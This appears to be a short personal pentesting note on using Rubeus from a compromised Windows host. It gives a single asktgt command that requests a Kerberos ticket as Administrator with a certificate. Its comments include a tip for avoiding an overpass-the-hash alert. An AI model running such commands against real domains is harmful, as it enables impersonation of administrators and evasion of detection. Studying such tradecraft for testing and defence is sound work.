# Rubeus

Rubeus is Active Directory exploitation tool that is prodominately used from compromised domain-joined Windows host, so gain access and compile [Rubeus](https://github.com/GhostPack/Rubeus) on the target machine. Compilation instructions can be found [here](https://github.com/GhostPack/Rubeus#compile-instructions)


Impersonate a User for [[AD-Certificate-Exploitation]], use Rubeus to request a TGT using the certificate to verify that the certificate is trusted - [[AD-Certificate-Exploitation]] and [[AD-Persistence-Certificates]]
```powershell
Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:$generated-cert /password:$cert-password /outfile:$output.pfx /domain:$domain /dc:$dc-ip
# /user has to match the UPN for the certificate
# set /enctype to avoid overpass-the-hash alert
# /dc: set to DC that has CA service running!
```